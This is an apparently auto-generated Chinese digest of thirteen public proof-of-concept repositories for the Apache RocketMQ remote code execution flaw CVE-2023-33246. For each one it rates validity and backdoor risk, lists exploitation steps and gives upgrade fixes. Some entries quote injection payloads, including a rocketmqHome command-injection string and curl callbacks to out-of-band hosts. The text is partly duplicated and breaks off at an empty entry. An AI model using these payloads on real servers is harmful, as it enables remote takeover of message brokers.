**漏洞编号:** CVE-2023-33246

**漏洞类型:** 远程代码执行

**影响应用:** Apache RocketMQ

**危害等级:** 高危，可能导致服务器被完全控制

**影响版本:** <= 5.1.0

**利用条件:** RocketMQ组件（NameServer, Broker, Controller）暴露在公网且未进行权限验证

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2023-33246是一个Apache RocketMQ中的远程代码执行漏洞。漏洞存在于5.1.0及更早版本中。由于RocketMQ的某些组件在公网暴露且缺乏权限验证，攻击者可以通过以下两种方式利用此漏洞：

1.  **利用更新配置功能：** 攻击者可以利用`updateBrokerConfig`方法，通过修改配置参数（例如`rocketmqHome`）来执行任意命令。POC代码中的`Main.java`文件演示了如何通过设置`rocketmqHome`属性来执行shell命令或反弹shell。

2.  **伪造RocketMQ协议内容：** 攻击者可以构造恶意的RocketMQ协议内容，绕过身份验证，从而执行命令。


**漏洞利用方式：**

1.  攻击者首先需要确定目标RocketMQ服务的NameServer地址。
2.  然后，攻击者可以使用POC代码中的`updateConfig`方法，修改Broker的配置，例如`rocketmqHome`，将其设置为包含恶意命令的字符串。
3.  RocketMQ服务在读取并应用新的配置时，会执行攻击者注入的命令。


**投毒风险分析：**

该POC代码的主要目的是演示漏洞的利用和缓解方法。`README.md`文件表明该项目旨在提供CVE-2023-33246的缓解措施，并且`BrokerConfig.java`文件包含了对`RocketmqHome`参数的增强验证。

`Main.java`包含用于攻击测试的代码，虽然用于演示漏洞利用，但不应被认为是投毒代码。

但是，仍然存在一些风险：

*   **潜在的供应链风险：** 依赖项`rocketmq-client`和`rocketmq-tools`可能存在未知的漏洞，虽然概率较低，但存在一定风险。
*   **代码缺陷：** 代码中可能存在未知的bug，可能被攻击者利用。
*   **误用：** 用户可能错误地将此代码部署到生产环境，导致安全风险。

因此，评估投毒风险为10%。大多数代码用于漏洞验证和防御，但依赖项和其他潜在问题始终存在一定风险。


**项目地址:** [PavilionQ/CVE-2023-33246-mitigation](https://github.com/PavilionQ/CVE-2023-33246-mitigation)

**漏洞详情:** [CVE-2023-33246](https://nvd.nist.gov/vuln/detail/CVE-2023-33246)

---

## POC #9

**来源**: [CVE-2023-33246-Sumitpathania03_Apache-RocketMQ-CVE-2023-33246-.md](../2023/CVE-2023-33246-Sumitpathania03_Apache-RocketMQ-CVE-2023-33246-.md)

# CVE-2023-33246

> 📦 该CVE有 **13** 个相关POC仓库

---

## POC #1

**来源**: [CVE-2023-33246-0xKayala_CVE-2023-33246.md](../2023/CVE-2023-33246-0xKayala_CVE-2023-33246.md)

## CVE-2023-33246-Apache RocketMQ-远程代码执行

**漏洞编号:** CVE-2023-33246

**漏洞类型:** 远程代码执行

**影响应用:** Apache RocketMQ

**危害等级:** 高危，可能导致服务器被完全控制

**影响版本:** <= 5.1.0

**利用条件:** RocketMQ的NameServer, Broker, 和 Controller 组件暴露在公网，且缺少权限验证

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2023-33246 是 Apache RocketMQ 中的一个远程代码执行漏洞。根据漏洞信息，如果 RocketMQ 的某些组件（如 NameServer、Broker 和 Controller）暴露在公网上，并且缺乏权限验证，攻击者可以通过更新配置功能或伪造 RocketMQ 协议内容来执行任意命令，从而完全控制服务器。

**有效性：**

根据CISA KEV收录信息, 此漏洞在野外被积极利用，证明其有效性。
提供的漏洞利用代码 `check.py` 是一个版本检测脚本，它通过连接目标端口并发送特定请求来判断 RocketMQ 的版本。虽然这个脚本本身并不能直接执行远程命令，但它可以用来确认目标是否为易受攻击的版本。

**投毒风险：**

查看 `check.py` 代码，主要是进行版本检测，虽然代码量比较大，但是没有发现明显的恶意代码或后门。代码中包含了大量 RocketMQ 的版本字符串，用于进行版本比对。 线程池用于并发扫描IP，网络请求部分使用了标准库，没有发现可疑的操作。因此，投毒风险较低，估计在 10% 左右。

**利用方式：**

1.  **版本检测：** 使用 `check.py` 脚本或其他方法检测目标 RocketMQ 实例的版本是否在受影响范围内（<= 5.1.0）。
2.  **漏洞利用：** 如果目标版本易受攻击，攻击者可以利用以下两种方式执行远程命令：
    *   **更新配置功能：** 攻击者可以利用未授权的访问权限，通过更新 RocketMQ 的配置来插入恶意命令。
    *   **伪造 RocketMQ 协议内容：** 攻击者可以构造恶意的 RocketMQ 协议数据包，发送给目标服务器，从而触发远程命令执行。

**修复建议：**

*   升级到 RocketMQ 5.1.1 或更高版本（如果使用 RocketMQ 5.x）。
*   升级到 RocketMQ 4.9.6 或更高版本（如果使用 RocketMQ 4.x）。
*   对暴露在公网的 RocketMQ 组件进行严格的权限控制和访问验证。

**项目地址:** [0xKayala/CVE-2023-33246](https://github.com/0xKayala/CVE-2023-33246)

**漏洞详情:** [CVE-2023-33246](https://nvd.nist.gov/vuln/detail/CVE-2023-33246)

---

## POC #2

**来源**: [CVE-2023-33246-4mazing_CVE-2023-33246-Copy.md](../2023/CVE-2023-33246-4mazing_CVE-2023-33246-Copy.md)

## CVE-2023-33246-Apache RocketMQ-远程代码执行

**漏洞编号:** CVE-2023-33246

**漏洞类型:** 远程代码执行

**影响应用:** Apache RocketMQ

**危害等级:** 高危，可能导致服务器被完全控制

**影响版本:** <= 5.1.0

**利用条件:** RocketMQ的NameServer、Broker或Controller组件暴露在公网，且未进行权限验证

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2023-33246 是 Apache RocketMQ 中的一个远程代码执行漏洞。由于 RocketMQ 的多个组件（NameServer、Broker 和 Controller）可能暴露在公网上且缺乏适当的权限验证，攻击者可以通过以下两种方式利用此漏洞：

1.  **更新配置功能：** 攻击者可以利用更新配置功能，通过发送恶意配置来执行任意命令，命令以 RocketMQ 运行用户的身份执行。
2.  **伪造 RocketMQ 协议内容：** 攻击者可以构造恶意的 RocketMQ 协议内容，达到执行命令的目的。

提供的漏洞利用代码是一个环境搭建的说明文档，引用了其他利用代码仓库。代码本身没有包含直接的漏洞利用payload，但给出了搭建漏洞环境的方法，参考链接包含着漏洞利用代码，因此可以判断该漏洞的POC是有效的。

**投毒风险分析：**

此仓库主要提供了环境搭建和参考链接，本身不包含直接的攻击代码，但间接引导用户使用参考链接中的POC。 如果参考链接的POC被植入恶意代码(例如反弹shell到恶意IP)，则存在投毒风险。由于无法直接评估参考链接的安全性，这里给出一个相对保守的估计，投毒风险的可能性为 10%。 这个风险主要来自于用户下载和使用来自不可信来源的POC。

**漏洞利用方式总结：**

1.  **漏洞定位：** 确定目标系统运行着受影响版本的 Apache RocketMQ，并且相关组件暴露在公网上。
2.  **攻击向量选择：** 选择利用更新配置功能或伪造 RocketMQ 协议内容这两种方式之一。
3.  **构造 Payload：** 构造包含恶意命令的 Payload。例如，如果利用更新配置功能，则需要构造能够执行任意命令的配置信息。如果伪造 RocketMQ 协议，则需要构造符合 RocketMQ 协议格式的恶意数据。
4.  **发送 Payload：** 将构造好的 Payload 发送到目标系统的 RocketMQ 组件。
5.  **执行命令：** 目标系统执行 Payload 中的命令，攻击者从而获得对系统的控制。

搜索引擎结果表明该漏洞已被广泛关注，并存在被利用的风险。CISA 也将此漏洞添加到已知被利用漏洞目录中，表明该漏洞具有较高的实际危害。

**项目地址:** [4mazing/CVE-2023-33246-Copy](https://github.com/4mazing/CVE-2023-33246-Copy)

**漏洞详情:** [CVE-2023-33246](https://nvd.nist.gov/vuln/detail/CVE-2023-33246)

---

## POC #3

**来源**: [CVE-2023-33246-AiK1d_CVE-2023-33246.md](../2023/CVE-2023-33246-AiK1d_CVE-2023-33246.md)

## CVE-2023-33246-Apache RocketMQ-远程代码执行

**漏洞编号:** CVE-2023-33246

**漏洞类型:** 远程代码执行

**影响应用:** Apache RocketMQ

**危害等级:** 高危，可执行任意命令

**影响版本:** <= 5.1.0

**利用条件:** 需要RocketMQ组件暴露在公网且缺乏权限验证

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2023-33246 是 Apache RocketMQ 中的一个远程代码执行 (RCE) 漏洞。该漏洞存在于5.1.0及更早版本中。由于 RocketMQ 的 NameServer、Broker 和 Controller 组件暴露在公网且缺乏权限验证，攻击者可以通过更新配置功能或伪造 RocketMQ 协议内容来执行任意命令，权限与 RocketMQ 运行的用户相同。提供的POC代码是一个检测工具，用于扫描目标是否存在漏洞。根据代码内容判断，投毒风险较低,因为只是检测是否存在漏洞。搜索引擎结果显示此漏洞已被广泛利用，并被添加到CISA的已知被利用漏洞目录中。利用方式包括更新配置和伪造协议内容。

**项目地址:** [AiK1d/CVE-2023-33246](https://github.com/AiK1d/CVE-2023-33246)

**漏洞详情:** [CVE-2023-33246](https://nvd.nist.gov/vuln/detail/CVE-2023-33246)

---

## POC #4

**来源**: [CVE-2023-33246-I5N0rth_CVE-2023-33246.md](../2023/CVE-2023-33246-I5N0rth_CVE-2023-33246.md)

## CVE-2023-33246-Apache RocketMQ-远程代码执行

**漏洞编号:** CVE-2023-33246

**漏洞类型:** 远程代码执行

**影响应用:** Apache RocketMQ

**危害等级:** 高危，可能导致服务器被完全控制

**影响版本:** <= 5.1.0

**利用条件:** RocketMQ的NameServer、Broker或Controller组件暴露在公网，且未进行权限验证

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2023-33246是Apache RocketMQ中的一个远程代码执行漏洞。攻击者可以通过更新RocketMQ的配置，注入恶意命令，从而以运行RocketMQ的用户身份执行任意代码。 

**有效性：**
根据漏洞库信息、搜索引擎结果和提供的POC代码，该漏洞的POC代码是有效的。漏洞库信息和搜索引擎结果表明该漏洞已经被广泛关注，并且存在公开的漏洞利用代码。POC代码通过修改`rocketmqHome`属性，注入包含反弹shell的命令。

**投毒风险：**
此仓库中存在作者隐藏的投毒代码的可能性较低，大概为10%。
*   `README.md` 仅包含漏洞说明和截图，没有可疑代码。
*   `pom.xml` 定义了项目依赖，只依赖了`rocketmq-client`，没有引入其他恶意的依赖项。
*   `src/main/java/org/example/Main.java` 是漏洞利用的主要代码，虽然代码本身利用漏洞进行远程代码执行，但没有发现其他额外的恶意行为。
urls数组包含的地址可能存在恶意，但是这些地址可以自行修改，不是仓库本身自带的恶意代码。

**利用方式：**
1.  **目标确认:** 确定目标RocketMQ服务的NameServer地址。
2.  **构造恶意配置：** 利用DefaultMQAdminExt工具，构造包含恶意命令的Properties对象。关键在于修改`rocketmqHome`参数，将其设置为包含命令注入的字符串。POC中使用了`-c $@|sh . echo ping chr17sz2vtc0000ymdaggehyuhhyyyyyb.oast.fun;`作为示例，攻击者可以替换为任何希望执行的命令。
3.  **更新Broker配置：** 使用`admin.updateBrokerConfig()`方法将恶意配置发送到目标Broker。由于漏洞存在于未授权访问，攻击者可以绕过身份验证直接发送配置。
4.  **命令执行：** Broker在处理更新后的配置时，会执行`rocketmqHome`参数中的恶意命令，实现远程代码执行。

**缓解措施：**
*   升级到RocketMQ 5.1.1或更高版本(5.x分支)，或4.9.6或更高版本(4.x分支)。
*   对RocketMQ组件（NameServer、Broker、Controller）进行严格的权限控制，避免暴露在公网上。

**项目地址:** [I5N0rth/CVE-2023-33246](https://github.com/I5N0rth/CVE-2023-33246)

**漏洞详情:** [CVE-2023-33246](https://nvd.nist.gov/vuln/detail/CVE-2023-33246)

---

## POC #5

**来源**: [CVE-2023-33246-Le1a_CVE-2023-33246.md](../2023/CVE-2023-33246-Le1a_CVE-2023-33246.md)

## CVE-2023-33246 - Apache RocketMQ 远程代码执行

**漏洞编号:** CVE-2023-33246

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Apache RocketMQ

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** <= 5.1.0

**利用条件:** 需要目标RocketMQ服务暴露在网络上，且无权限验证或存在可绕过的权限验证。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2023-33246是Apache RocketMQ中的一个远程代码执行漏洞。根据漏洞库信息和搜索结果，攻击者可以通过以下方式利用该漏洞：

1.  **利用方式:**  通过更新配置功能执行任意命令。RocketMQ的NameServer、Broker和Controller组件如果暴露在公网上且缺乏权限验证，攻击者可以通过更新配置的方式，执行任意系统命令，从而控制服务器。或者通过伪造RocketMQ协议内容也可以达到同样的效果。
2.  **POC有效性:**  提供的POC代码（java -jar CVE-2023-33246.jar -ip \"127.0.0.1:10911\" -cmd \"open -a Calculator\"）尝试利用此漏洞。该POC声称会在35秒延时后执行命令，并自动还原配置，以减少对目标环境的影响。基于漏洞描述，此POC代码应该有效。
3. **投毒风险评估:**

分析漏洞利用代码中的 README.md 文件，可以看到以下几点：

*   **自动化还原配置:** 工具声称在利用漏洞后会自动还原配置，以避免持久性影响。但此操作依赖程序正确运行完成，若中途强制关闭可能无法还原。
*   **延时执行:** 为了确保漏洞被触发，工具设置了35秒的延时，这个延时可以解释为等待心跳机制触发漏洞利用。

**风险评估:**

*   **较高风险:**  该工具可以执行任意命令，因此如果被恶意修改，可以植入后门、窃取数据或进行其他恶意活动。
*   **低度混淆:**  目前的代码没有明显的混淆或隐藏恶意功能的行为。

综上所述，虽然POC代码本身似乎是为了方便利用漏洞而编写，但仍存在一定的投毒风险。恶意攻击者可以修改该POC，在执行命令前后添加恶意代码，例如植入后门或窃取敏感信息。此外，如果工具在执行过程中被中断，自动还原配置的功能可能失效，导致目标系统配置被恶意更改。因此, 判定存在10%的投毒风险。

**项目地址:** [Le1a/CVE-2023-33246](https://github.com/Le1a/CVE-2023-33246)

**漏洞详情:** [CVE-2023-33246](https://nvd.nist.gov/vuln/detail/CVE-2023-33246)

---

## POC #6

**来源**: [CVE-2023-33246-Malayke_CVE-2023-33246_RocketMQ_RCE_EXPLOIT.md](../2023/CVE-2023-33246-Malayke_CVE-2023-33246_RocketMQ_RCE_EXPLOIT.md)

## CVE-2023-33246-Apache RocketMQ-远程代码执行

**漏洞编号:** CVE-2023-33246

**漏洞类型:** 远程代码执行

**影响应用:** Apache RocketMQ

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** <= 5.1.0

**利用条件:** RocketMQ NameServer、Broker 或 Controller 组件暴露在公网，且未进行权限验证

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2023-33246 是 Apache RocketMQ 中的一个远程代码执行漏洞。根据漏洞信息和搜索结果，该漏洞是由于 RocketMQ 的某些组件（NameServer、Broker、Controller）暴露在公网且缺乏权限验证，攻击者可以通过更新配置功能或伪造 RocketMQ 协议内容来执行任意命令，获得服务器的控制权限。

**有效性:**
提供的 POC 代码 `CVE-2023-33246_RocketMQ_RCE_EXPLOIT.py` 通过 socket 连接到目标 RocketMQ 服务，构造包含恶意命令的 payload 并发送，从而实现远程代码执行。根据搜索结果，该漏洞已经被积极利用，POC 代码的有效性较高。

**投毒风险:**
查看提供的 POC 代码，该脚本主要功能是构造并发送恶意 payload，执行指定的命令。经过分析，未发现明显的投毒代码，例如下载执行恶意文件或篡改系统配置等操作。因此，认为该仓库中存在作者隐藏的投毒代码的概率较低，约为 0%。

**利用方式:**
1.  **目标确定:** 确定目标 RocketMQ 服务的 IP 地址和端口（默认端口可能为 9876）。
2.  **Payload 构造:** 使用 POC 脚本，指定要执行的命令。POC 脚本会将命令嵌入到特定的 RocketMQ 协议格式中，构造恶意的 payload。
3.  **发送 Payload:** POC 脚本通过 socket 连接到目标 RocketMQ 服务，并将构造的 payload 发送过去。
4.  **命令执行:** 如果目标 RocketMQ 服务存在漏洞且未进行修复，它将解析并执行 payload 中的命令，从而实现远程代码执行。

**项目地址:** [Malayke/CVE-2023-33246_RocketMQ_RCE_EXPLOIT](https://github.com/Malayke/CVE-2023-33246_RocketMQ_RCE_EXPLOIT)

**漏洞详情:** [CVE-2023-33246](https://nvd.nist.gov/vuln/detail/CVE-2023-33246)

---

## POC #7

**来源**: [CVE-2023-33246-MkJos_CVE-2023-33246_RocketMQ_RCE_EXP.md](../2023/CVE-2023-33246-MkJos_CVE-2023-33246_RocketMQ_RCE_EXP.md)

## CVE-2023-33246 Apache RocketMQ 远程代码执行

**漏洞编号:** CVE-2023-33246

**漏洞类型:** 远程代码执行

**影响应用:** Apache RocketMQ

**危害等级:** 高危，允许未经授权的远程代码执行

**影响版本:** <= 5.1.0

**利用条件:** RocketMQ Broker组件暴露在公网且未进行权限验证

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2023-33246 存在于 Apache RocketMQ 5.1.0 及更早版本中。由于 RocketMQ 的 NameServer、Broker 和 Controller 等组件暴露在公网上，且缺乏权限验证，攻击者可以利用 update configuration 功能，或通过伪造 RocketMQ 协议内容，以 RocketMQ 运行的系统用户身份执行任意命令。

**有效性：**

根据漏洞信息和搜索结果，该漏洞是一个已知的、被积极利用的远程代码执行漏洞。CISA 已将其添加到已知被利用的漏洞目录中。存在公开可用的PoC利用代码。

**投毒风险：**

PoC代码主要包含版本检测脚本（`RocketMQRceCheck`）和漏洞利用脚本（`RocketMQ_RCE_EXPLOIT`）。

*   版本检测脚本：用于检查目标 RocketMQ 服务的版本，判断是否存在漏洞。
*   漏洞利用脚本：通过发送恶意配置更新请求，或伪造 RocketMQ 协议，来执行任意命令。

README.md 文件中给出的利用方式是直接执行命令，例如 `curl chw9ft72vtc00002z5k0ge6rz7eyyyyyb.oast.fun/test`。这种利用方式本身不包含明显的投毒代码，但攻击者可以通过替换命令为恶意payload来达到投毒目的，例如下载并执行恶意脚本。另外检测脚本理论上也可以携带恶意payload，但可能性较低，因为check的目的是检查，携带恶意代码容易被发现。

考虑到代码仓库的作者可能会在利用脚本中嵌入后门，或使用隐蔽的方式执行恶意操作，因此存在一定的投毒风险，风险程度大约为10%。

**利用方式：**

1.  **组件暴露：**  攻击者首先需要确定目标 RocketMQ 的相关组件（如 Broker）暴露在公网上。
2.  **版本检测：**  攻击者可以使用 `RocketMQRceCheck` 脚本或其他方法来检测目标 RocketMQ 服务的版本，确认是否存在漏洞。
3.  **RCE利用：**
    *   **更新配置：** 攻击者可以利用 update configuration 功能，发送包含恶意命令的配置更新请求。  该命令将会被目标服务器执行。
    *   **协议伪造：** 攻击者还可以伪造 RocketMQ 协议内容，发送恶意请求到目标服务器，从而执行任意命令。通常命令执行的结果会通过外连的方式传回，例如利用curl命令将结果发送到攻击者控制的服务器上。
4.  **命令执行：**  成功利用漏洞后，攻击者可以以 RocketMQ 运行的系统用户身份执行任意命令，例如安装恶意软件、窃取敏感数据等。

**项目地址:** [MkJos/CVE-2023-33246_RocketMQ_RCE_EXP](https://github.com/MkJos/CVE-2023-33246_RocketMQ_RCE_EXP)

**漏洞详情:** [CVE-2023-33246](https://nvd.nist.gov/vuln/detail/CVE-2023-33246)

---

## POC #8

**来源**: [CVE-2023-33246-PavilionQ_CVE-2023-33246-mitigation.md](../2023/CVE-2023-33246-PavilionQ_CVE-2023-33246-mitigation.md)

## CVE-2023-33246-Apache RocketMQ-远程代码执行

**漏洞编号:** CVE-2023-33246

**漏洞类型:** 远程代码执行

**影响应用:** Apache RocketMQ

**危害等级:** 高危，可能导致服务器被完全控制

**影响版本:** <= 5.1.0

**利用条件:** RocketMQ组件（NameServer, Broker, Controller）暴露在公网且未进行权限验证

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2023-33246是一个Apache RocketMQ中的远程代码执行漏洞。漏洞存在于5.1.0及更早版本中。由于RocketMQ的某些组件在公网暴露且缺乏权限验证，攻击者可以通过以下两种方式利用此漏洞：

1.  **利用更新配置功能：** 攻击者可以利用`updateBrokerConfig`方法，通过修改配置参数（例如`rocketmqHome`）来执行任意命令。POC代码中的`Main.java`文件演示了如何通过设置`rocketmqHome`属性来执行shell命令或反弹shell。

2.  **伪造RocketMQ协议内容：** 攻击者可以构造恶意的RocketMQ协议内容，绕过身份验证，从而执行命令。


**漏洞利用方式：**

1.  攻击者首先需要确定目标RocketMQ服务的NameServer地址。
2.  然后，攻击者可以使用POC代码中的`updateConfig`方法，修改Broker的配置，例如`rocketmqHome`，将其设置为包含恶意命令的字符串。
3.  RocketMQ服务在读取并应用新的配置时，会执行攻击者注入的命令。


**投毒风险分析：**

该POC代码的主要目的是演示漏洞的利用和缓解方法。`README.md`文件表明该项目旨在提供CVE-2023-33246的缓解措施，并且`BrokerConfig.java`文件包含了对`RocketmqHome`参数的增强验证。

`Main.java`包含用于攻击测试的代码，虽然用于演示漏洞利用，但不应被认为是投毒代码。

但是，仍然存在一些风险：

*   **潜在的供应链风险：** 依赖项`rocketmq-client`和`rocketmq-tools`可能存在未知的漏洞，虽然概率较低，但存在一定风险。
*   **代码缺陷：** 代码中可能存在未知的bug，可能被攻击者利用。
*   **误用：** 用户可能错误地将此代码部署到生产环境，导致安全风险。

因此，评估投毒风险为10%。大多数代码用于漏洞验证和防御，但依赖项和其他潜在问题始终存在一定风险。


**项目地址:** [PavilionQ/CVE-2023-33246-mitigation](https://github.com/PavilionQ/CVE-2023-33246-mitigation)

**漏洞详情:** [CVE-2023-33246](https://nvd.nist.gov/vuln/detail/CVE-2023-33246)

---

## POC #9

**来源**: [CVE-2023-33246-Sumitpathania03_Apache-RocketMQ-CVE-2023-33246-.md](../2023/CVE-2023-33246-Sumitpathania03_Apache-RocketMQ-CVE-2023-33246-.md)

## CVE-2023-33246 Apache RocketMQ 远程代码执行

**漏洞编号:** CVE-2023-33246

**漏洞类型:** 远程代码执行

**影响应用:** Apache RocketMQ

**危害等级:** 高危，允许未经身份验证的攻击者执行任意命令。

**影响版本:** <= 5.1.0

**利用条件:** RocketMQ的NameServer、Broker或Controller组件暴露在公网，且未进行权限验证。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2023-33246 存在于 Apache RocketMQ 5.1.0 及以下版本中。由于多个组件（包括 NameServer、Broker 和 Controller）暴露在外部网络且缺乏权限验证，攻击者可以通过更新配置功能以运行 RocketMQ 的系统用户身份执行命令。或者，攻击者可以通过伪造 RocketMQ 协议内容达到相同的效果。

**有效性：**

提供的 POC 代码 `CVE-2023-33246_RocketMQ_RCE_EXPLOIT.py` 看起来是有效的。从 `README.md` 文件中可以看到使用示例和相关截图，证明其可以利用该漏洞执行任意命令。代码通过构造特定的请求数据包，利用 `UpdateBrokerConfig()` 函数执行命令。

**投毒风险：**

虽然 POC 代码的主要功能是利用漏洞执行命令，但仍然存在一定的投毒风险。分析代码发现，它使用了一个固定的 payload 前缀和后缀，中间拼接用户提供的命令。理论上，作者可以在 payload 的前缀或后缀中添加恶意代码，例如下载并执行恶意脚本，或者修改系统文件等。虽然这种风险较低，但仍然需要注意。

从代码逻辑和仓库内容来看，投毒风险评估为 10%。 风险主要来自以下几个方面：

*   代码中存在硬编码的 payload 部分，攻击者可能在这些部分植入恶意代码。
*   虽然 POC 主要功能是执行命令，但其行为仍然可能被滥用，用于进行恶意活动。

**利用方式：**

1.  **漏洞定位：** 漏洞位于 RocketMQ 的配置更新功能中，具体是 `UpdateBrokerConfig()` 函数。
2.  **攻击条件：** 需要 RocketMQ 的 NameServer、Broker 或 Controller 组件暴露在公网上，且未配置适当的权限验证。
3.  **攻击步骤：**
    a.  构造恶意的请求数据包，设置请求代码为 '25'，触发 `UpdateBrokerConfig()` 函数。
    b.  在请求数据包中包含要执行的命令，利用 `rocketmqHome` 配置项或其他可利用的配置项执行命令。
    c.  发送数据包到目标 RocketMQ 组件。
4.  **利用结果：** 成功利用漏洞后，攻击者可以以 RocketMQ 进程运行的用户身份执行任意系统命令。

**缓解措施：**

*   升级到 RocketMQ 5.1.1 或更高版本，或者 RocketMQ 4.9.6 或更高版本。
*   对 RocketMQ 组件进行适当的权限验证，避免未经授权的访问。
*   限制 RocketMQ 组件的网络暴露，避免直接暴露在公网上。
*   监控 RocketMQ 服务的异常行为，及时发现并响应潜在的攻击。

**项目地址:** [Sumitpathania03/Apache-RocketMQ-CVE-2023-33246-](https://github.com/Sumitpathania03/Apache-RocketMQ-CVE-2023-33246-)

**漏洞详情:** [CVE-2023-33246](https://nvd.nist.gov/vuln/detail/CVE-2023-33246)

---

## POC #10

**来源**: [CVE-2023-33246-SuperZero_CVE-2023-33246.md](../2023/CVE-2023-33246-SuperZero_CVE-2023-33246.md)

## CVE-2023-33246-Apache RocketMQ-远程代码执行

**漏洞编号:** CVE-2023-33246

**漏洞类型:** 远程代码执行

**影响应用:** Apache RocketMQ

**危害等级:** 高危，可能导致服务器被完全控制

**影响版本:** <= 5.1.0

**利用条件:** 需要RocketMQ NameServer, Broker, 或 Controller组件暴露在公网且无权限验证

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2023-33246是Apache RocketMQ 5.1.0及以下版本中存在的远程代码执行漏洞。根据漏洞描述，当RocketMQ的NameServer、Broker或Controller组件暴露在公网且缺乏权限验证时，攻击者可以通过更新配置功能或者伪造RocketMQ协议内容来执行任意命令，从而完全控制服务器。

**有效性：**
根据CISA KEV目录、NVD、Arctic Wolf等多个信息源，此漏洞已被积极利用，并存在公开可用的PoC代码，因此判断该漏洞的PoC代码有效。

**投毒风险：**
提供的PoC代码（从README.md文件来看）是一个Java程序，通过命令行参数指定目标IP地址和要执行的命令。 风险较低，因为如果存在后门,一般在jar包里面,而不是README.md说明文件里，用户可以使用反编译工具分析jar包。

**利用方式：**
利用方式主要有两种：

1.  **更新配置功能：** 攻击者利用RocketMQ的配置更新接口，注入恶意命令到配置项中，导致服务器执行任意命令。
2.  **伪造RocketMQ协议内容：** 攻击者构造包含恶意命令的RocketMQ协议数据包，发送到目标服务器，触发远程代码执行。

总而言之，利用此漏洞需要目标服务器存在可被攻击的RocketMQ组件且未进行严格的权限控制。 搜索引擎结果显示该漏洞已被DreamBus僵尸网络利用，说明该漏洞具有较高的威胁性。

**项目地址:** [SuperZero/CVE-2023-33246](https://github.com/SuperZero/CVE-2023-33246)

**漏洞详情:** [CVE-2023-33246](https://nvd.nist.gov/vuln/detail/CVE-2023-33246)

---

## POC #11

**来源**: [CVE-2023-33246-d0rb_CVE-2023-33246.md](../2023/CVE-2023-33246-d0rb_CVE-2023-33246.md)

## CVE-2023-33246-Apache RocketMQ-远程代码执行

**漏洞编号:** CVE-2023-33246

**漏洞类型:** 远程代码执行

**影响应用:** Apache RocketMQ

**危害等级:** 高危，可能导致服务器被完全控制

**影响版本:** <= 5.1.0

**利用条件:** RocketMQ的NameServer, Broker或Controller组件暴露在公网上，且没有进行严格的权限验证。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2023-33246是Apache RocketMQ中的一个远程代码执行漏洞。根据漏洞库信息和搜索结果，攻击者可以利用RocketMQ的配置更新功能，在未授权的情况下执行任意命令，从而控制服务器。

**有效性：**
根据提供的PoC代码，该漏洞利用的有效性较高。该PoC通过构造恶意的配置更新请求，其中包含可以执行任意命令的payload（curl {{interactsh-url}}），然后将该请求发送到RocketMQ的服务器端口(通常是10911端口)。如果服务器存在漏洞，就会执行该命令。

**投毒风险：**
分析提供的PoC代码，未发现明显的投毒代码。PoC代码的主要功能是利用漏洞执行命令，没有发现任何额外恶意行为或后门。Payload是`curl {{interactsh-url}}`，只是用来验证漏洞是否存在，并非真正的恶意指令，所以投毒风险评估为0%。

**利用方式：**
1.  **漏洞发现：** 确认目标系统运行着存在漏洞的Apache RocketMQ版本（<= 5.1.0）。
2.  **组件确认：** 确认NameServer, Broker或Controller组件暴露在公网上且未做鉴权。
3.  **构造Payload：** 构造包含恶意命令的Payload。PoC代码中使用`curl {{interactsh-url}}`进行验证，实际利用中可以替换为其他命令。
4.  **发送请求：** 将构造好的Payload封装在配置更新请求中，发送到目标服务器的端口（通常是10911）。
5.  **执行命令：** 如果漏洞存在且利用成功，服务器将执行Payload中的恶意命令。

总而言之，此漏洞的利用方式较为简单，PoC的利用有效性较高，且PoC代码本身未发现投毒风险。

**项目地址:** [d0rb/CVE-2023-33246](https://github.com/d0rb/CVE-2023-33246)

**漏洞详情:** [CVE-2023-33246](https://nvd.nist.gov/vuln/detail/CVE-2023-33246)

---

## POC #12

**来源**: [CVE-2023-33246-shoucheng3_apache__rocketmq_CVE-2023-33246_5-1-0.md](../2023/CVE-2023-33246-shoucheng3_apache__rocketmq_CVE-2023-33246_5-1-0.md)

## CVE-2023-33246 Apache RocketMQ 远程代码执行

**漏洞编号:** CVE-2023-33246

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Apache RocketMQ

**危害等级:** 高危，允许未经授权的远程代码执行

**影响版本:** <= 5.1.0

**利用条件:** RocketMQ 组件（NameServer, Broker, Controller）暴露在公网且缺乏权限验证

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2023-33246 允许攻击者通过利用 RocketMQ 的更新配置功能或伪造 RocketMQ 协议内容来执行任意命令，以运行 RocketMQ 的系统用户身份。漏洞存在于 RocketMQ 5.1.0 及以下版本。

**漏洞利用方式：**

1.  **利用更新配置功能：** 攻击者可以发送恶意请求，修改 RocketMQ 的配置，从而执行任意系统命令。
2.  **伪造 RocketMQ 协议内容：**  攻击者可以构造恶意的 RocketMQ 协议数据包，诱导 RocketMQ 服务端执行恶意代码。

**POC有效性评估：**

根据漏洞描述、搜索结果（特别是GitHub链接）和CISA KEV目录信息，可以确定存在可用的POC，并且该漏洞已经被积极利用。

**投毒风险评估：**

提供的代码片段看起来是构建文件（BUILD.bazel）、构建说明(BUILDING)和贡献指南(CONTRIBUTING.md)，这些文件本身不太可能包含恶意代码。但是，漏洞的利用可能涉及修改配置文件或发送特定格式的数据包，这些恶意配置或数据包可能包含投毒代码。因此，仓库中存在作者隐藏的投毒代码的风险较低，大约为10%。 主要风险在于后续利用过程中引入恶意配置或载荷的可能性。

**项目地址:** [shoucheng3/apache__rocketmq_CVE-2023-33246_5-1-0](https://github.com/shoucheng3/apache__rocketmq_CVE-2023-33246_5-1-0)

**漏洞详情:** [CVE-2023-33246](https://nvd.nist.gov/vuln/detail/CVE-2023-33246)

---

## POC #13

